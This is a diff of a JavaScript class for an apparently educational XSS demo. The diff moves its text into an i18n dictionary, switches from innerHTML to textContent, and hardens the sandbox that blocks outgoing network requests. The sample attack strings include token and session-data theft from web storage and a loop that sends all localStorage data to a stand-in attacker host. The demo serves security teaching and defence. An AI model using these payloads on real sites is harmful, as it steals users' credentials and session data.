@@ -1,73 +1,58 @@
-export class XSSDemo {
+class XSSDemo {
   constructor() {
     this.xssInput = document.getElementById("xssInput");
     this.xssResult = document.getElementById("xssResult");
+    // 表示する文言は辞書から取る。ここにはコードと識別子だけを置く。
     this.attackCategories = {
       basic: {
-        name: "🎯 基本的な攻撃",
-        description: "単純なlocalStorageアクセス攻撃",
         scripts: [
-          {
-            code: 'localStorage.getItem("token")',
-            name: "トークン窃取",
-            explanation: "認証トークンを直接取得"
-          },
-          {
-            code: 'sessionStorage.getItem("user_data")',
-            name: "セッションデータ窃取", 
-            explanation: "セッションストレージからユーザー情報を取得"
-          }
+          { id: "token", code: 'localStorage.getItem("token")' },
+          { id: "session", code: 'sessionStorage.getItem("user_data")' }
         ]
       },
       advanced: {
-        name: "🔥 高度な攻撃",
-        description: "全データ窃取や持続的攻撃",
         scripts: [
-          {
-            code: 'Object.keys(localStorage).map(k => `${k}: ${localStorage.getItem(k)}`).join("\\n")',
-            name: "全データ列挙",
-            explanation: "localStorage内の全データを一覧表示"
-          },
-          {
-            code: 'JSON.stringify(localStorage)',
-            name: "JSON形式で全取得",
-            explanation: "全データをJSON形式で構造化して取得"
-          }
+          { id: "enumerate", code: 'Object.keys(localStorage).map(k => `${k}: ${localStorage.getItem(k)}`).join("\\n")' },
+          { id: "json", code: "JSON.stringify(localStorage)" }
         ]
       },
       persistent: {
-        name: "💀 持続的攻撃",
-        description: "マルウェア埋め込みや継続的な攻撃",
         scripts: [
-          {
-            code: 'localStorage.setItem("malware", "<script>alert(\\"Persistent XSS!\\")</script>")',
-            name: "マルウェア埋め込み",
-            explanation: "悪意のあるコードをlocalStorageに保存"
-          },
-          {
-            code: 'for(let i=0; i<localStorage.length; i++) { const key = localStorage.key(i); fetch(`https://evil.com/steal?${key}=${localStorage.getItem(key)}`); }',
-            name: "外部送信攻撃",
-            explanation: "全データを攻撃者のサーバーへ送信"
-          }
+          { id: "malware", code: 'localStorage.setItem("malware", "<script>alert(\\"Persistent XSS!\\")</script>")' },
+          { id: "exfiltrate", code: 'for(let i=0; i<localStorage.length; i++) { const key = localStorage.key(i); fetch(`https://evil.example/steal?${key}=${localStorage.getItem(key)}`); }' }
         ]
       }
     };
   }
 
+  t(key, params) {
+    return window.i18n.t(key, params);
+  }
+
+  el(tag, props = {}, children = []) {
+    const node = document.createElement(tag);
+    for (const [name, value] of Object.entries(props)) {
+      if (name === "class") node.className = value;
+      else if (name === "text") node.textContent = value;
+      else if (value !== null && value !== undefined) node.setAttribute(name, value);
+    }
+    for (const child of [].concat(children)) {
+      if (child) node.append(child);
+    }
+    return node;
+  }
+
   init() {
-    window.runXSS = () => this.runXSS();
     this.addExampleButtons();
     this.addWarning();
   }
 
   addWarning() {
-    const warningElement = document.createElement("div");
-    warningElement.className = "xss-warning";
-    warningElement.innerHTML = `
-      <strong>⚠️ 警告:</strong> このデモは教育目的のみです。
-      実際のWebサイトで同様のコードを実行しないでください。
-    `;
-    
+    const warningElement = this.el("div", { class: "xss-warning" }, [
+      this.el("strong", { text: this.t("xss.warningLabel") }),
+      document.createTextNode(" " + this.t("xss.warningBody"))
+    ]);
+
     const xssSection = document.getElementById("xss");
     const firstChild = xssSection.querySelector("p");
     if (firstChild) {
@@ -76,74 +61,69 @@ export class XSSDemo {
   }
 
   addExampleButtons() {
-    const exampleContainer = document.createElement("div");
-    exampleContainer.className = "xss-examples";
-    exampleContainer.innerHTML = "<h3>🎯 攻撃シナリオ選択</h3>";
-    
+    const exampleContainer = this.el("div", { class: "xss-examples" }, [
+      this.el("h3", { text: this.t("xss.scenarioHeading") })
+    ]);
+
     Object.entries(this.attackCategories).forEach(([categoryId, category]) => {
-      const categorySection = document.createElement("div");
-      categorySection.className = "attack-category";
-      
-      const categoryHeader = document.createElement("div");
-      categoryHeader.className = "category-header";
-      categoryHeader.innerHTML = `
-        <h4>${category.name}</h4>
-        <p class="category-description">${category.description}</p>
-      `;
-      categorySection.appendChild(categoryHeader);
-      
-      const scriptsContainer = document.createElement("div");
-      scriptsContainer.className = "attack-scripts";
-      
-      category.scripts.forEach((script, index) => {
-        const scriptCard = document.createElement("div");
-        scriptCard.className = "attack-script-card";
-        scriptCard.innerHTML = `
-          <div class="script-info">
-            <strong>${script.name}</strong>
-            <span class="script-explanation">${script.explanation}</span>
-          </div>
-          <button class="select-script-btn" data-code="${script.code.replace(/"/g, '&quot;')}">
-            選択
-          </button>
-        `;
-        
-        scriptCard.querySelector('.select-script-btn').onclick = () => {
+      const categorySection = this.el("div", { class: "attack-category" }, [
+        this.el("div", { class: "category-header" }, [
+          this.el("h4", { text: this.t(`xss.category.${categoryId}.name`) }),
+          this.el("p", { class: "category-description", text: this.t(`xss.category.${categoryId}.description`) })
+        ])
+      ]);
+
+      const scriptsContainer = this.el("div", { class: "attack-scripts" });
+
+      category.scripts.forEach((script) => {
+        const button = this.el("button", {
+          class: "select-script-btn",
+          type: "button",
+          text: this.t("xss.select")
+        });
+        button.addEventListener("click", () => {
           this.xssInput.value = script.code;
-          this.showScriptExplanation(script);
-        };
-        
-        scriptsContainer.appendChild(scriptCard);
+          this.showScriptExplanation(categoryId, script);
+        });
+
+        scriptsContainer.appendChild(this.el("div", { class: "attack-script-card" }, [
+          this.el("div", { class: "script-info" }, [
+            this.el("strong", { text: this.t(`xss.script.${script.id}.name`) }),
+            this.el("span", { class: "script-explanation", text: this.t(`xss.script.${script.id}.explanation`) })
+          ]),
+          button
+        ]));
       });
-      
+
       categorySection.appendChild(scriptsContainer);
       exampleContainer.appendChild(categorySection);
     });
-    
+
     this.xssInput.parentNode.insertBefore(exampleContainer, this.xssInput);
   }
 
-  showScriptExplanation(script) {
-    let explanationDiv = document.querySelector('.script-explanation-active');
-    if (explanationDiv) {
-      explanationDiv.remove();
-    }
-    
-    explanationDiv = document.createElement('div');
-    explanationDiv.className = 'script-explanation-active';
-    explanationDiv.innerHTML = `
-      <div class="explanation-content">
-        <h4>📝 選択された攻撃: ${script.name}</h4>
-        <p><strong>動作:</strong> ${script.explanation}</p>
-        <p><strong>コード:</strong></p>
-        <code>${script.code}</code>
-        <div class="risk-indicator">
-          <span class="risk-level">🔴 高リスク</span>
-          <span>実際の攻撃では個人情報やアカウントが盗まれる可能性があります</span>
-        </div>
-      </div>
-    `;
-    
+  showScriptExplanation(categoryId, script) {
+    const existing = document.querySelector(".script-explanation-active");
+    if (existing) existing.remove();
+
+    // コードはtextContentで入れる。
+    // 以前はHTML文字列へ差し込んでいたため、<script>を含む例でタグとして解釈されていた。
+    const explanationDiv = this.el("div", { class: "script-explanation-active" }, [
+      this.el("div", { class: "explanation-content" }, [
+        this.el("h4", { text: this.t("xss.selectedAttack", { name: this.t(`xss.script.${script.id}.name`) }) }),
+        this.el("p", {}, [
+          this.el("strong", { text: this.t("xss.behaviorLabel") }),
+          document.createTextNode(" " + this.t(`xss.script.${script.id}.explanation`))
+        ]),
+        this.el("p", {}, [this.el("strong", { text: this.t("xss.codeLabel") })]),
+        this.el("code", { text: script.code }),
+        this.el("div", { class: "risk-indicator" }, [
+          this.el("span", { class: "risk-level", text: this.t("xss.riskLevel") }),
+          this.el("span", { text: this.t("xss.riskNote") })
+        ])
+      ])
+    ]);
+
     this.xssInput.parentNode.insertBefore(explanationDiv, this.xssInput.nextSibling);
   }
 
@@ -151,7 +131,7 @@ export class XSSDemo {
     const input = this.xssInput.value.trim();
     
     if (!input) {
-      this.showResult("スクリプトを入力してください", "info");
+      this.showResult(this.t("xss.result.needInput"), "info");
       return;
     }
 
@@ -159,8 +139,9 @@ export class XSSDemo {
     this.ensureDemoData(input);
     this.showExecutionSteps(input);
     
+    let restoreSandbox = () => {};
+
     try {
-      console.log("XSSデモ実行:", input);
 
       const originalAlert = window.alert;
       const originalFetch = window.fetch;
@@ -175,6 +156,18 @@ export class XSSDemo {
       // thisのコンテキストを保存
       const self = this;
 
+      // 差し替えるより先に復元手順を決めておく。
+      // 途中で例外が出ても、必ずこの関数で元へ戻せるようにする。
+      restoreSandbox = () => {
+        window.alert = originalAlert;
+        window.fetch = originalFetch;
+        window.XMLHttpRequest = originalXMLHttpRequest;
+        window.WebSocket = originalWebSocket;
+        window.Image = originalImage;
+        navigator.sendBeacon = originalSendBeacon;
+      };
+
+
       window.alert = (msg) => {
         alertContent = msg;
         self.logSecurityEvent("ALERT_CALLED", { message: msg });
@@ -183,7 +176,12 @@ export class XSSDemo {
       window.fetch = (url, options) => {
         fetchAttempts.push({ url, options });
         self.logSecurityEvent("EXTERNAL_REQUEST_BLOCKED", { url, options });
-        return Promise.reject(new Error("セキュリティ: 外部送信をブロックしました"));
+        // 拒否したPromiseをそのまま返すと、デモのスクリプトが受け取らない場合に
+        // 「未処理のPromise拒否」としてコンソールへ出る。
+        // 同じPromiseへ空のcatchを付けて、処理済みとして扱う。
+        const rejected = Promise.reject(new Error(self.t("xss.blocked.request")));
+        rejected.catch(() => {});
+        return rejected;
       };
 
       // XMLHttpRequestをブロック
@@ -202,7 +200,7 @@ export class XSSDemo {
         constructor(url) {
           blockedRequests.push({ type: 'WebSocket', url });
           self.logSecurityEvent("EXTERNAL_REQUEST_BLOCKED", { type: 'WebSocket', url });
-          throw new Error("セキュリティ: WebSocket接続をブロックしました");
+          throw new Error(this.t("xss.blocked.websocket"));
         }
       };
 
@@ -233,61 +231,55 @@ export class XSSDemo {
       const afterStorage = this.captureStorageSnapshot();
 
       // すべてのオーバーライドを元に戻す
-      window.alert = originalAlert;
-      window.fetch = originalFetch;
-      window.XMLHttpRequest = originalXMLHttpRequest;
-      window.WebSocket = originalWebSocket;
-      window.Image = originalImage;
-      navigator.sendBeacon = originalSendBeacon;
+      restoreSandbox();
 
       // 全ての試行をカウント
       const totalBlockedRequests = fetchAttempts.length + blockedRequests.length;
       this.analyzeSecurityImpact(beforeStorage, afterStorage, totalBlockedRequests);
       
       if (alertContent !== null) {
-        this.showResult(`alert内容: ${alertContent}`, "alert");
+        this.showResult(this.t("xss.result.alert", { content: alertContent }), "alert");
       } else {
         // 外部送信攻撃の場合（fetch使用を優先判定）
         if (input.includes('fetch(') && (input.includes('localStorage') || input.includes('sessionStorage'))) {
-          this.showResult("⚠️ 外部送信攻撃を実行しました（セキュリティ機能により通信はブロック済み）", "alert");
+          this.showResult(this.t("xss.result.blocked"), "alert");
         }
         // setItem系の攻撃の場合
         else if (input.includes('localStorage.setItem') || input.includes('sessionStorage.setItem')) {
-          this.showResult("✅ 攻撃スクリプトの実行が完了しました（データがストレージに書き込まれました）", "success");
+          this.showResult(this.t("xss.result.written"), "success");
         }
         // 通常の結果表示
         else if (result !== undefined) {
-          this.showResult(`実行結果: ${this.formatResult(result)}`, "success");
+          this.showResult(this.t("xss.result.value", { value: this.formatResult(result) }), "success");
         } else {
-          this.showResult("実行完了（結果なし）", "info");
+          this.showResult(this.t("xss.result.empty"), "info");
         }
       }
       
     } catch (e) {
-      this.showResult(`エラー: ${e.message}`, "error");
+      restoreSandbox();
+      this.showResult(this.t("xss.result.error", { message: e.message }), "error");
     }
   }
 
   showExecutionSteps(script) {
-    const stepsDiv = document.createElement('div');
-    stepsDiv.className = 'execution-steps';
-    stepsDiv.innerHTML = `
-      <h4>🔍 実行ステップ</h4>
-      <ol class="steps-list">
-        <li class="step-item">✅ 入力スクリプトの検証完了</li>
-        <li class="step-item">🔐 セキュリティ環境の準備完了</li>
-        <li class="step-item">📊 ストレージ状態の記録開始</li>
-        <li class="step-item active">⚡ スクリプト実行中...</li>
-      </ol>
-    `;
-    
+    const steps = ["validated", "sandbox", "snapshot"].map((name) =>
+      this.el("li", { class: "step-item", text: this.t(`xss.step.${name}`) })
+    );
+    const running = this.el("li", { class: "step-item active", text: this.t("xss.step.running") });
+
+    const stepsDiv = this.el("div", { class: "execution-steps" }, [
+      this.el("h4", { text: this.t("xss.stepsHeading") }),
+      this.el("ol", { class: "steps-list" }, [...steps, running])
+    ]);
+
     this.xssResult.parentNode.insertBefore(stepsDiv, this.xssResult);
-    
+
     setTimeout(() => {
-      const lastStep = stepsDiv.querySelector('.step-item.active');
+      const lastStep = stepsDiv.querySelector(".step-item.active");
       if (lastStep) {
-        lastStep.textContent = '✅ スクリプト実行完了';
-        lastStep.classList.remove('active');
+        lastStep.textContent = this.t("xss.step.done");
+        lastStep.classList.remove("active");
       }
     }, 500);
   }
@@ -346,71 +338,66 @@ export class XSSDemo {
   }
 
   displaySecurityAnalysis(changes) {
-    const hasChanges = changes.localStorage.added.length || 
-                      changes.localStorage.modified.length || 
+    const hasChanges = changes.localStorage.added.length ||
+                      changes.localStorage.modified.length ||
                       changes.localStorage.removed.length ||
-                      changes.sessionStorage.added.length || 
-                      changes.sessionStorage.modified.length || 
+                      changes.sessionStorage.added.length ||
+                      changes.sessionStorage.modified.length ||
                       changes.sessionStorage.removed.length ||
                       changes.externalRequests > 0;
-    
-    if (hasChanges) {
-      const analysisDiv = document.createElement('div');
-      analysisDiv.className = 'security-analysis';
-      analysisDiv.innerHTML = `
-        <h4>🛡️ セキュリティ影響分析</h4>
-        ${this.generateAnalysisReport(changes)}
-      `;
-      
-      this.xssResult.parentNode.insertBefore(analysisDiv, this.xssResult);
-    }
+
+    if (!hasChanges) return;
+
+    const analysisDiv = this.el("div", { class: "security-analysis" }, [
+      this.el("h4", { text: this.t("xss.analysisHeading") }),
+      this.buildAnalysisReport(changes)
+    ]);
+
+    this.xssResult.parentNode.insertBefore(analysisDiv, this.xssResult);
   }
 
-  generateAnalysisReport(changes) {
-    let report = '<div class="analysis-report">';
-    
-    if (changes.localStorage.added.length || changes.localStorage.modified.length || changes.localStorage.removed.length) {
-      report += `
-        <div class="storage-changes">
-          <h5>📦 localStorage への影響:</h5>
-          <ul>
-            ${changes.localStorage.added.map(key => `<li class="change-added">➕ 追加: "${key}"`).join('')}
-            ${changes.localStorage.modified.map(key => `<li class="change-modified">✏️ 変更: "${key}"`).join('')}
-            ${changes.localStorage.removed.map(key => `<li class="change-removed">❌ 削除: "${key}"`).join('')}
-          </ul>
-        </div>
-      `;
+  // キーはHTML文字列へ差し込まず、textContentで入れる。
+  // 引用符を含むキーでも表示が壊れない。
+  buildChangeList(changes) {
+    const list = this.el("ul");
+    const rows = [
+      ["added", "change-added", "xss.change.added"],
+      ["modified", "change-modified", "xss.change.modified"],
+      ["removed", "change-removed", "xss.change.removed"]
+    ];
+    for (const [field, className, labelKey] of rows) {
+      for (const key of changes[field]) {
+        list.appendChild(this.el("li", { class: className, text: this.t(labelKey, { key }) }));
+      }
     }
-    
-    if (changes.sessionStorage.added.length || changes.sessionStorage.modified.length || changes.sessionStorage.removed.length) {
-      report += `
-        <div class="storage-changes">
-          <h5>⏳ sessionStorage への影響:</h5>
-          <ul>
-            ${changes.sessionStorage.added.map(key => `<li class="change-added">➕ 追加: "${key}"`).join('')}
-            ${changes.sessionStorage.modified.map(key => `<li class="change-modified">✏️ 変更: "${key}"`).join('')}
-            ${changes.sessionStorage.removed.map(key => `<li class="change-removed">❌ 削除: "${key}"`).join('')}
-          </ul>
-        </div>
-      `;
+    return list;
+  }
+
+  buildAnalysisReport(changes) {
+    const report = this.el("div", { class: "analysis-report" });
+
+    for (const [area, headingKey] of [["localStorage", "xss.impact.local"], ["sessionStorage", "xss.impact.session"]]) {
+      const target = changes[area];
+      if (!(target.added.length || target.modified.length || target.removed.length)) continue;
+      report.appendChild(this.el("div", { class: "storage-changes" }, [
+        this.el("h5", { text: this.t(headingKey) }),
+        this.buildChangeList(target)
+      ]));
     }
-    
+
     if (changes.externalRequests > 0) {
-      report += `
-        <div class="security-threat">
-          <h5>🚨 外部通信の試行:</h5>
-          <p class="threat-blocked">${changes.externalRequests}件の外部送信試行をブロックしました</p>
-          <p class="threat-warning">⚠️ 実際の攻撃では、この通信により個人情報が盗まれます</p>
-        </div>
-      `;
+      report.appendChild(this.el("div", { class: "security-threat" }, [
+        this.el("h5", { text: this.t("xss.threatHeading") }),
+        this.el("p", { class: "threat-blocked", text: this.t("xss.threatBlocked", { count: changes.externalRequests }) }),
+        this.el("p", { class: "threat-warning", text: this.t("xss.threatWarning") })
+      ]));
     }
-    
-    report += '</div>';
+
     return report;
   }
 
   logSecurityEvent(type, data) {
-    console.warn(`セキュリティイベント [${type}]:`, data);
+    console.warn(`[security event] ${type}`, data);
   }
 
   ensureDemoData(script) {
@@ -441,17 +428,15 @@ export class XSSDemo {
   }
 
   showDataPreparationNotice(dataType) {
-    const notice = document.createElement('div');
-    notice.className = 'data-preparation-notice';
-    notice.innerHTML = `
-      <div class="notice-content">
-        <span class="notice-icon">📋</span>
-        <span class="notice-text">デモ用に "${dataType}" をlocalStorageに自動追加しました</span>
-      </div>
-    `;
-    
+    const notice = this.el("div", { class: "data-preparation-notice" }, [
+      this.el("div", { class: "notice-content" }, [
+        this.el("span", { class: "notice-icon", text: "📋" }),
+        this.el("span", { class: "notice-text", text: this.t("xss.demoDataAdded", { name: dataType }) })
+      ])
+    ]);
+
     this.xssResult.parentNode.insertBefore(notice, this.xssResult);
-    
+
     // 3秒後に自動で削除
     setTimeout(() => {
       notice.remove();
@@ -493,3 +478,5 @@ export class XSSDemo {
   }
 
 }
+
+window.XSSDemo = XSSDemo;
